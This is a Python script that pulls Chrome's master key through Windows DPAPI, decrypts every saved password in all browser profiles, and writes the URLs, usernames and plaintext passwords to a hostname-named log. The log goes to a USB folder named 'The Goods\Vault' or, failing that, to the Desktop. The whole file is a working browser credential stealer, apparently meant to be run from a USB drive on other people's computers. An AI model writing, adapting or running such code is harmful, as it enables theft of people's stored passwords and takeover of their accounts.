import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import socket

# Get the hostname of the computer
hostname = socket.gethostname()

# GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

def get_secret_key():
    try:
        # (1) Get secret key from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove DPAPI prefix
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome secret key cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        # (3-a) Initialization vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome database cannot be found")
        return None

if __name__ == '__main__':
    try:
        # Specify the USB drive's path and file name
        usb_drive_path = "D:\\The Goods\\Vault\\"
        desktop_folder = os.path.join(os.path.expanduser("~"), "Desktop")
        
        # Determine where to save the log file
        log_file_path = os.path.join(usb_drive_path, f'{hostname}_Logs.txt')
        if not os.path.exists(usb_drive_path):
            log_file_path = os.path.join(desktop_folder, f'{hostname}_Logs.txt')
        
        # Create a text file to store logs
        with open(log_file_path, mode='w', encoding='utf-8') as log_file:
             # Get secret key
            secret_key = get_secret_key()
            
            # Search user profile or default folder
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            
            for folder in folders:
                # Get ciphertext from SQLite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        
                        if url and username and ciphertext:
                            # Decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            log = f"Sequence: {index}\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}\n"
                            print(log)
                            log_file.write(log)
                    
                    # Close database connection
                    cursor.close()
                    conn.close()
                    
                    # Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        error_log = "[ERR] %s\n" % str(e)
        print(error_log)
        log_file.write(error_log)
